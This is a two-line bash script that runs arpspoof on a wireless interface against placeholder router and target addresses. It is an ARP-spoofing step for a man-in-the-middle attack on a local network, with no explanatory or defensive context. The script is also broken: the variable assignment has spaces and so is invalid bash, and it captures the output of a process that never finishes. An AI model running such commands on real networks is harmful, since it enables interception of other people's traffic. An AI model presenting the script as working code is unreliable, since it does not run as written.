#!/bin/bash
arp = $(arpspoof -i wlan0 -t router_ip target_ip)
